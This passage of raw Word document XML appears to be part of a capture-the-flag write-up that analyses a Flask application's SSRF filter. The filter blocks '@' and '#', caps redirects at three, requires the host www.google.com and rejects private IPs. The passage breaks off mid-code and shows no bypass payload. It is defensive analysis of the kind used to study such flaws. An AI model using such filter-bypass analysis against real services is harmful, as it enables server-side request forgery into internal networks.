        <w:t>3. Backen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>d Code Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352852E2" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>The application is built using Flask and implements several SSRF protection mechanisms. Let's examine the key components:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67007F77" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>check_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ssrf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>, checked):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    global </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>isSafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    if "@" in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> or "#" in url:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>isSafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> = False</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> "Fail"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    if checked &gt; 3:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        print("URLs that are redirected more than 3 times are prohibited.")</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>isSafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> = False</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        return "Fail"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    # ... more code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1926F07E" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t xml:space="preserve">First observation: The application blocks URLs containing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>@</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> characters and limits redirect chains to 3 redirects.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E4D9B5" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">protocol = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>re.match</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">(r'^[^:]+', </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>url</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t>if protocol is None:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>isSafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> = False</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    print("Protocol was not detected.")</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    return "Fail"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">print("Protocol :", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>protocol.group</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t xml:space="preserve">if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>protocol.group</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>() == "http"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>protocol.group</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>() == "https":</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    host = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>re.search</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">(r'(?&lt;=//)[^/]+', </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>url</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t xml:space="preserve">    # ... more code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3780B69E" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>Second observation: Only HTTP and HTTPS protocols are allowed, and the host is extracted using a regex.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FEA9846" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">host = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>host.group</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>if host != "www.google.com":</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>isS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>afe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> = False</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    return "Host must be www.google.com."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E09D35" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t xml:space="preserve">Third observation: The initial URL must have </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>www.google.com</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as the host.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FBC3AF" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">for _ in </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>range(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>2): # Loop to prevent DNS Rebinding attacks</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    print("Verifying IP..", _)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ip_address</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>socket.gethostbyname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>(h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ost) # Get IP from the host</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ipaddress.ip_address</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ip_address</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is_private</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>: # If any one of the IPs is an internal IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        print("Internal network IP was detected.")</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>isSafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> = False</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        return "Fail"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
